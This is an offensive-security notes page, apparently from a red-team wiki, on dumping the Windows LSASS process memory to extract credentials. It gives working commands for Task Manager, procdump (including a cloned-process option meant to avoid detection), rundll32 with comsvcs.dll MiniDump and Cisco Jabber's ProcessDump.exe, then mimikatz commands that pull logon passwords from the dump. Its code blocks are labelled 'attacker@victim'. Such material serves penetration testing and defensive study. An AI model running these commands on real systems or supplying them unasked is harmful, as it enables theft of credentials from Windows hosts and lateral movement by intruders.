# Dumping Lsass Without Mimikatz

## Dumping Lsass Without Mimikatz

### MiniDumpWriteDump API

See my notes about writing a simple custom process dumper using `MiniDumpWriteDump` API:

{% content-ref url="dumping-lsass-without-mimikatz-with-minidumpwritedump.md" %}
[dumping-lsass-without-mimikatz-with-minidumpwritedump.md](dumping-lsass-without-mimikatz-with-minidumpwritedump.md)
{% endcontent-ref %}

### Task Manager

Create a minidump of the lsass.exe using task manager (must be running as administrator):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nTRoRHqLqkBWb_aw4%2FScreenshot%20from%202019-03-12%2019-55-27.png?alt=media\&token=0c8f45d6-6425-4d5a-8e3f-1f30ff4577ec)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nTYMBz-VWM11dadu6%2FScreenshot%20from%202019-03-12%2019-56-12.png?alt=media\&token=f92b493e-f1aa-4a46-8edf-d64eebdd9f65)

Swtich mimikatz context to the minidump:

{% code title="attacker\@mimikatz" %}
```csharp
sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP
sekurlsa::logonpasswords
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nT6tDqGhJv_fdKOnw%2FScreenshot%20from%202019-03-12%2019-54-15.png?alt=media\&token=cccc99d5-632c-40aa-903d-d89c21fb1133)

### Procdump

Procdump from sysinternal's could also be used to dump the process:

{% code title="attacker\@victim" %}
```csharp
procdump.exe -accepteula -ma lsass.exe lsass.dmp

// or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nX2I6LfCsWLSkjzwg%2FScreenshot%20from%202019-03-12%2020-11-28.png?alt=media\&token=43e85fd4-36bf-43ba-9fd9-62d43712e1e8)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nXVaJRSNnJZayxbL_%2FScreenshot%20from%202019-03-12%2020-13-25.png?alt=media\&token=4e87b3ef-c690-4b43-b3f6-0ba244495398)

### comsvcs.dll

Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:

```
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoG16iq5s4cG9bO2Uwu%2F-LoG1NZ07abmT8sRpq5j%2Fimage.png?alt=media\&token=ed56fd5d-4a6b-4fd6-b293-5de10102c689)

### ProcessDump.exe from Cisco Jabber

Sometimes Cisco Jabber (always?) comes with a nice utility called `ProcessDump.exe` that can be found in `c:\program files (x86)\cisco systems\cisco jabber\x64\`. We can use it to dump lsass process memory in Powershell like so:

```
cd c:\program files (x86)\cisco systems\cisco jabber\x64\
processdump.exe (ps lsass).id c:\temp\lsass.dmp
```

![screenshot by @em1rerdogan](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MIKN6WyFqg533jI6DWr%2F-MIN_LsfWiT70TxZoUgc%2Fimage.png?alt=media\&token=9a811af0-0b75-45be-8b94-77f5e95bf7f5)

### References

{% embed url="https://t.co/s2VePo3ICo?amp=1" %}

